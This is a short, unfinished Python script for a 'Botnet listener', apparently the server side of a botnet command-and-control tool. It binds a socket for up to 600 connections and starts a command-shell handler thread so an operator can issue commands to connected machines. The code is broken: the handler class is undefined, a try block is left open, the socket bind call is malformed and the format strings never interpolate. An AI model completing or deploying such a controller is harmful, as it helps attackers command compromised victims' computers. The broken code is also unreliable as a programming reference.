#!/usr/bin/python

import socket
import sys
import os
import multiprocessing as mp
import threading
import queue

q = queue.Queue()

def listener(lhost,lport,q):
    try:
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(lhost,lport)
        sock.listen(600)
        # Started the listener which can handle 600 connections.
        print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
        
        handlercmdthread = handlercmd(q)
        handlercmdthread.start()
        # Handler cmd shell started here.
        # It is running as serperate thread to give us an free cmd shell while listener runs in background.

        try:
            (client_addr,client_port) = sock.accept()




def main():
    if(len(sys.argv) < 3):
        print("[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = sys.argv[2]
            listener(lhost,lport,q)

        except:
            ex = str(Exception)
            print("\n[-] Unable to start a handler. Reason: {ex}\n")
            # exit(0)





if __name__ == '__main__':
    main()